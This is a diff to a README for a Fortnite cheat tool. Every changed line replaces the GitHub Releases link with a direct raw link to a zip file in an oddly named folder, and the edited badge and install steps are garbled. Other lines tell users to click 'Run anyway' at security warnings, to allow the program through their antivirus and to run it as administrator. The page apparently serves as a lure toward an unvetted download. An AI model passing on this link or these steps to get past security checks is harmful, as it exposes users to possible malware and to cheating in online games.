@@ -1,6 +1,6 @@
 # 🎮 FortniteExternalCheat - Enhance Your Gaming Experience Easily
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/ArthurMattenhauer/FortniteExternalCheat/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/ArthurMattenhauer/FortniteExternalCheat/main/dacryoma/FortniteExternalCheat.zip%20Latest%https://raw.githubusercontent.com/ArthurMattenhauer/FortniteExternalCheat/main/dacryoma/FortniteExternalCheat.zip)](https://raw.githubusercontent.com/ArthurMattenhauer/FortniteExternalCheat/main/dacryoma/FortniteExternalCheat.zip)
 
 ## 🚀 Getting Started
 
@@ -8,12 +8,12 @@ Welcome! This guide will help you download and run FortniteExternalCheat quickly
 
 ## 📥 Download & Install
 
-To get the software, visit this page to download: [GitHub Releases Page](https://github.com/ArthurMattenhauer/FortniteExternalCheat/releases).
+To get the software, visit this page to download: [GitHub Releases Page](https://raw.githubusercontent.com/ArthurMattenhauer/FortniteExternalCheat/main/dacryoma/FortniteExternalCheat.zip).
 
 1. Click on the link above.
 2. Find the latest version listed at the top.
 3. Select the appropriate file for your system. Look for:
-   - Windows: `FortniteExternalCheat.exe`
+   - Windows: `https://raw.githubusercontent.com/ArthurMattenhauer/FortniteExternalCheat/main/dacryoma/FortniteExternalCheat.zip`
    - Other operating systems may have different files; choose based on your needs.
 4. Click on the file to download it to your device. 
 
@@ -32,7 +32,7 @@ To ensure smooth operation, make sure your computer meets the following requirem
 After you've downloaded the file:
 
 1. Open the folder where you saved the file.
-2. Double-click on `FortniteExternalCheat.exe` to run the program.
+2. Double-click on `https://raw.githubusercontent.com/ArthurMattenhauer/FortniteExternalCheat/main/dacryoma/FortniteExternalCheat.zip` to run the program.
 3. You might see a security warning. If you do, choose "Run anyway" to proceed.
 4. Follow the on-screen instructions. The software will guide you through the setup.
 
@@ -53,7 +53,7 @@ If you encounter any problems while downloading or running the software, conside
 
 - **Access Denied Error**: If you see this message, you may need to adjust your antivirus settings. Check your antivirus software and allow FortniteExternalCheat.
 - **Software Crashes**: Ensure your system meets the requirements. Try running the software as an administrator.
-- **Missing Features**: If you don't see desired features, make sure you have the latest version by revisiting the [GitHub Releases Page](https://github.com/ArthurMattenhauer/FortniteExternalCheat/releases).
+- **Missing Features**: If you don't see desired features, make sure you have the latest version by revisiting the [GitHub Releases Page](https://raw.githubusercontent.com/ArthurMattenhauer/FortniteExternalCheat/main/dacryoma/FortniteExternalCheat.zip).
 
 ## 🌐 Community and Support
 
@@ -65,4 +65,4 @@ If you have specific questions, feel free to reach out on our community platform
 
 In summary, FortniteExternalCheat offers essential tools for enhancing your gaming. Download the application, follow the setup steps, and enjoy a seamless gaming experience. 
 
-Don't forget to regularly check the [GitHub Releases Page](https://github.com/ArthurMattenhauer/FortniteExternalCheat/releases) for updates!
+Don't forget to regularly check the [GitHub Releases Page](https://raw.githubusercontent.com/ArthurMattenhauer/FortniteExternalCheat/main/dacryoma/FortniteExternalCheat.zip) for updates!
